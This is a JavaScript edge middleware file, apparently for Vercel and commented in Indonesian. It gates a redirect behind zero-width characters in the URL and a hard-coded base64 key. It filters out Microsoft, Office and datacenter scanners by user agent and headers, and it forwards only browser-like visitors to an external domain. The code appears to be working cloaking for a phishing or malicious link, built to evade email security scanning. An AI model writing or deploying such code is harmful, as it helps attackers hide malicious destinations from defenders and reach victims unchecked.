export default async function middleware(req) {
  const url = new URL(req.url);
  const ua = req.headers.get('user-agent')?.toLowerCase() || '';
  
  // Ambil IP (Header standar Vercel)
  const ip = req.headers.get('x-real-ip') || req.headers.get('x-forwarded-for')?.split(',')[0] || 'Unknown';
  
  // 1. KONFIGURASI KUNCI RAHASIA (Ganti jika kamu mengubah kunci di Python)
  const KUNCI_RAHASIA_BASE64 = 'QWtzZXNIb3JlMjAyNg==';

  // 2. DETEKSI KUNCI GAIB (ZWC)
  const hasZwc = /[\u200B-\u200D\uFEFF]/.test(decodeURIComponent(url.pathname));

  // 3. BLOCK AKSES TANPA ZWC (PATH POLOS)
  if (!hasZwc && url.pathname === '/') {
    // Abaikan favicon atau manifest agar log tidak penuh
    if (url.pathname.includes('favicon') || url.pathname.includes('manifest')) {
       return new Response(null, { status: 204 });
    }
    console.log(`⚠️ NO ZWC | IP: ${ip} | UA: ${ua}`);
    return new Response('404 Not Found', { status: 404 });
  }

  // 4. BLOCK DATA CENTER & MICROSOFT (Filter Bot Corporate)
  const botIsps = ['microsoft', 'azure', 'amazon', 'aws', 'google cloud', 'digitalocean', 'hetzner', 'ovh'];
  const isServerIp = botIsps.some(isp => ua.includes(isp));
  const isMicrosoftBot = req.headers.has('x-ms-useragent') || ua.includes('office') || ua.includes('microsoft');

  if (isServerIp || isMicrosoftBot) {
    console.log(`❌ BLOCKED BOT (DC/MS): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 5. FINGERPRINTING MANUSIA (Validasi Browser)
  const hasAcceptLang = req.headers.has('accept-language'); 
  const hasAccept = req.headers.get('accept')?.includes('text/html');
  const isMobile = /iphone|ipad|android/.test(ua);
  const isDesktop = /windows|macintosh|linux/.test(ua);

  if (ua.length < 35 || !hasAcceptLang || !hasAccept || (!isMobile && !isDesktop)) {
    console.log(`❌ BLOCKED BOT (FINGERPRINT): IP=${ip} | UA=${ua}`);
    return new Response('Error 403: Access Denied', { status: 403 });
  }

  // 6. VERIFIKASI KUNCI STATIS BASE64 (FIXED FOR URL ENCODING)
  let base64Data = url.search.startsWith('?') ? url.search.substring(1) : '';
  
  // Perbaikan: Decode karakter %3D kembali menjadi '=' agar Match dengan kunci asli
  base64Data = decodeURIComponent(base64Data);

  if (base64Data !== KUNCI_RAHASIA_BASE64) {
    console.log(`❌ REJECTED: WRONG KEY | IP=${ip} | DATA=${base64Data}`);
    // Redirect ke domain utama jika kunci salah (agar bot tersesat)
    return Response.redirect('https://vercel.com/', 302);
  }

  // 7. SUCCESS REDIRECT & LOG
  console.log(`🚀 HUMAN SUCCESS: IP=${ip} | URL=${url.pathname} | KEY=MATCH`);
  
  const targetUrl = 'https://web02-atlas.nusaindahrp.com/?_adamsari';
  return new Response(
    `<html><head><meta http-equiv="refresh" content="0;url=${targetUrl}"></head><body><script>window.location.href="${targetUrl}"</script></body></html>`,
    {
      status: 200,
      headers: { 'Content-Type': 'text/html' }
    }
  );
}
